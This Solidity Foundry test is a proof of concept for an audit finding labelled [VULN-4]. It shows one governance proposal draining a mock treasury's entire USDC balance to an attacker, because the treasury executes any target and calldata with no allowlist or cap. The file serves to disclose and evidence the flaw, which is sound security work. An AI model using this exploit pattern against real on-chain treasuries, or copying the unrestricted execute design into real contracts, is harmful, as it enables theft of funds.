// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";
import {VulnX100Governor, IVotesLike} from "../contracts/targets/VulnX100Governor.sol";
import {VulnX100Treasury} from "../contracts/targets/VulnX100Treasury.sol";

/// PoC — [VULN-4] Over-privileged treasury.
/// A single governor call drains 100% of an arbitrary ERC20 held by the treasury,
/// because `execute` permits any target + calldata with no allowlist or cap.
contract TreasuryOverprivilegeTest is Test {
    MockERC20 token;
    MockERC20 usdc;
    VulnX100Governor gov;
    VulnX100Treasury treasury;

    address whale = makeAddr("whale");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new MockERC20("X100", "X100");
        usdc = new MockERC20("USD Coin", "USDC");
        gov = new VulnX100Governor(IVotesLike(address(token)));
        treasury = new VulnX100Treasury();
        treasury.setGovernor(address(gov));
        gov.setTreasury(address(treasury));

        token.mint(whale, 300_000e18);
        token.mint(address(0xdead), 700_000e18);

        // Simulated treasury holdings: 5,000,000 USDC.
        usdc.mint(address(treasury), 5_000_000e18);
    }

    function test_single_proposal_drains_entire_treasury() public {
        assertEq(usdc.balanceOf(address(treasury)), 5_000_000e18, "treasury funded");

        // Proposal encodes an arbitrary ERC20 transfer of the FULL balance to attacker.
        bytes memory data = abi.encodeWithSignature(
            "transfer(address,uint256)", attacker, 5_000_000e18
        );
        uint256 id = gov.propose(address(usdc), 0, data);

        vm.prank(whale);
        gov.castVote(id, true);
        (, , , , uint64 deadline, ) = gov.proposalInfo(id);
        vm.warp(deadline + 1);
        gov.execute(id);

        assertEq(usdc.balanceOf(attacker), 5_000_000e18, "EVIDENCE: attacker received full treasury");
        assertEq(usdc.balanceOf(address(treasury)), 0, "EVIDENCE: treasury fully drained in one proposal");
    }
}
